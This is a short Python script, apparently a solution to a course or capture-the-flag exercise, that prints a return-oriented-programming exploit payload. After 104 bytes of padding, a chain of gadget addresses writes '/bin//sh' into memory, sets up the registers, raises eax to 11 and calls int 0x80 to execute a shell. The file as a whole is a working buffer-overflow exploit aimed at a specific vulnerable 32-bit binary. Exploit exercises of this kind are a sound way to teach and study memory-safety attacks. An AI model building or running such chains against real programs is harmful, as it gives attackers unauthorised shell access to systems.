#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
p = b''

p += b'\x90'*104

p += pack('<I', 0x08056014) # pop eax ; pop edx ; pop ebx ; ret
p += b'/bin'
p += pack('<I', 0x080d9060) # store /bin in 0x080d9060
p += b'/bin' # padding
p += pack('<I', 0x08056b45) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x08056014) # pop eax ; pop edx ; pop ebx ; ret
p += b'//sh'
p += pack('<I', 0x080d9064) # store //sh in 0x080d9064
p += b'//sh' # padding
p += pack('<I', 0x08056b45) # mov dword ptr [edx], eax ; ret

# produce null then store that in 0x080d9068
p += pack('<I', 0x0805cca8) # pop edx ; ret
p += pack('<I', 0x080d9068) # null
p += pack('<I', 0x08069b4e) # nop ; nop ; xor eax, eax ; pop edi ; pop ebx ; ret
p += b'\x90'*4
p += pack('<I', 0x080d9060) # ebx -> /bin//sh
p += pack('<I', 0x08056b45) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806de72) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080d9068) # null
p += pack('<I', 0x080d9060) # padding without overwrite ebx

p += pack('<I', 0x08069b4e) # nop ; nop ; xor eax, eax ; pop edi ; pop ebx ; ret
p += b'\x90'*4
p += pack('<I', 0x080d9060) # padding without overwrite ebx
p += pack('<I', 0x0807b2ea) # inc eax ; ret
p += pack('<I', 0x0807b2ea) # 2
p += pack('<I', 0x0807b2ea) # 3
p += pack('<I', 0x0807b2ea) # 4
p += pack('<I', 0x0807b2ea) # 5
p += pack('<I', 0x0807b2ea) # 6
p += pack('<I', 0x0807b2ea) # 7
p += pack('<I', 0x0807b2ea) # 8
p += pack('<I', 0x0807b2ea) # 9
p += pack('<I', 0x0807b2ea) # 10
p += pack('<I', 0x0807b2ea) # 11
p += pack('<I', 0x080495c3) # int 0x80

sys.stdout.buffer.write(p)

